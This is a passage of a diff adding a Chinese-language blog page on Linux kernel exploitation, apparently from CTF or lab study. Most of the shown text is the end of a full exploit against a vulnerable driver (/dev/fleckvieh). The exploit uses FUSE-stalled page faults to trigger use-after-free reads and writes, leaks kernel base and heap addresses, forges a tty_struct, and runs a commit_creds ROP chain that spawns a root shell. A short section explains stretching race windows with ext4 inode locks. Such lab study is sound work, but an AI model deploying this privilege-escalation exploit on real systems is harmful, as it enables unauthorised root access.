+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] spawning a FUSE thread</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    pthread_t th;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;th, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, fuse_thread, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] waiting for setup done</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(!setup_done)
+</span><span style="color:#c0c5ce;">        ;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/fleckvieh</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/fleckvieh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*page;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    buf = (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)</span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] UAF#1 leak kbase</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] reading 0x20 bytes from victim blob to page</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    page = </span><span style="color:#8fa1b3;">mmap_fuse_file</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    victim = </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">get</span><span style="color:#c0c5ce;">(victim, page, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    kbase = *(</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)&amp;((</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)page)[</span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">] - ofs_tty_ops;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; SPRAY_NUM; i++)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(ptmx[i]);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> saved_dev_ptr = *(</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(page + </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] UAF#2 leak kheap</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    page = </span><span style="color:#8fa1b3;">mmap_fuse_file</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    victim = </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] reading 0x400 bytes from victim blob to page</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">get</span><span style="color:#c0c5ce;">(victim, page, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    kheap = *(</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(page + </span><span style="color:#d08770;">0x38</span><span style="color:#c0c5ce;">) - </span><span style="color:#d08770;">0x38</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; SPRAY_NUM; i++)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(ptmx[i]);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] leaked kbase: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;">, kheap: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, kbase, kheap);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] crafting fake tty_struct in buf</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buf, page, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*tty = (</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)buf;
+</span><span style="color:#c0c5ce;">    tty[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x0000000100005401</span><span style="color:#c0c5ce;">;        </span><span style="color:#65737e;">// magic
+</span><span style="color:#c0c5ce;">    tty[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">] = saved_dev_ptr;             </span><span style="color:#65737e;">// dev
+</span><span style="color:#c0c5ce;">    tty[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] = kheap;                     </span><span style="color:#65737e;">// ops
+</span><span style="color:#c0c5ce;">    tty[</span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">] = push_rdx_pop_rsp_pop_ret; </span><span style="color:#65737e;">// ops-&gt;ioctl
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] crafting rop chain</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*chain = (</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(buf + </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    *chain++ = </span><span style="color:#d08770;">0xdeadbeef</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// pop
+</span><span style="color:#c0c5ce;">    *chain++ = pop_rdi_ret;
+</span><span style="color:#c0c5ce;">    *chain++ = init_cred;
+</span><span style="color:#c0c5ce;">    *chain++ = commit_creds;
+</span><span style="color:#c0c5ce;">    *chain++ = swapgs_restore_regs_and_return_to_usermode;
+</span><span style="color:#c0c5ce;">    *chain++ = </span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    *chain++ = </span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    *chain++ = (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)&amp;spawn_shell;
+</span><span style="color:#c0c5ce;">    *chain++ = user_cs;
+</span><span style="color:#c0c5ce;">    *chain++ = user_rflags;
+</span><span style="color:#c0c5ce;">    *chain++ = user_sp;
+</span><span style="color:#c0c5ce;">    *chain++ = user_ss;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] UAF#3 write rop chain</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    page = </span><span style="color:#8fa1b3;">mmap_fuse_file</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    victim = </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">set</span><span style="color:#c0c5ce;">(victim, page, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] invoking ioctl to hijack control flow</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; SPRAY_NUM; i++)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(ptmx[i], </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, kheap + </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">getchar</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h2 id="wen-jian-xi-tong-suo">文件系统锁</h2><p>以 ext4 文件系统的数据写入为例，可以看到在执行 <code>generic_perform_write</code> 函数进行实际的数据写入之前，都需要对 inode 进行一次上锁（即 <code>inode_lock(inode)</code> 调用）：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">ssize_t </span><span style="color:#8fa1b3;">ext4_buffered_write_iter</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> kiocb *</span><span style="color:#bf616a;">iocb</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">					</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iov_iter *</span><span style="color:#bf616a;">from</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	ssize_t ret;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> inode *inode = </span><span style="color:#8fa1b3;">file_inode</span><span style="color:#c0c5ce;">(iocb-&gt;ki_filp);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(iocb-&gt;ki_flags &amp; IOCB_NOWAIT)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EOPNOTSUPP;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">inode_lock</span><span style="color:#c0c5ce;">(inode);
+</span><span style="color:#c0c5ce;">	ret = </span><span style="color:#8fa1b3;">ext4_write_checks</span><span style="color:#c0c5ce;">(iocb, from);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	ret = </span><span style="color:#8fa1b3;">generic_perform_write</span><span style="color:#c0c5ce;">(iocb, from);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">out:
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">inode_unlock</span><span style="color:#c0c5ce;">(inode);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(ret &lt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">))
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">generic_write_sync</span><span style="color:#c0c5ce;">(iocb, ret);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>如果有一个进程率先对某个文件进行超大量数据写入，那么另一个进程在对相同文件执行写入操作时，将会一直等待 inode 锁的释放。通过测试可知，4GB 数据的写入可以使得后一个进程等待数十秒（取决于硬盘性能），因此这个 inode 锁同样可以延长竞争窗口。</p>
+<h2 id="reference">reference</h2><p>fuse</p>
+<ul>
+<li>https://exploiter.dev/blog/2022/FUSE-exploit.html</li>
+<li>https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_fuse.c</li>
+<li>https://pawnyable.cafe/linux-kernel/LK04/fuse.html</li>
+<li>https://blog.wohin.me/posts/pawnyable-0304/</li>
+<li>https://github.com/LukeGix/FUSEFs_exploitation/blob/main/fusefs.c</li>
+</ul>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#userfaultfd">userfaultfd</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#gai-shu">概述</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#shi-yong-fang-fa">使用方法</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#fuse">FUSE</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#gai-shu">概述</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#shi-yong-fang-fa-1">使用方法1</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#shi-yong-fang-fa-2">使用方法2</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#yi-ge-wan-zheng-can-kao-exp">一个完整参考exp</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#wen-jian-xi-tong-suo">文件系统锁</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#reference">reference</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
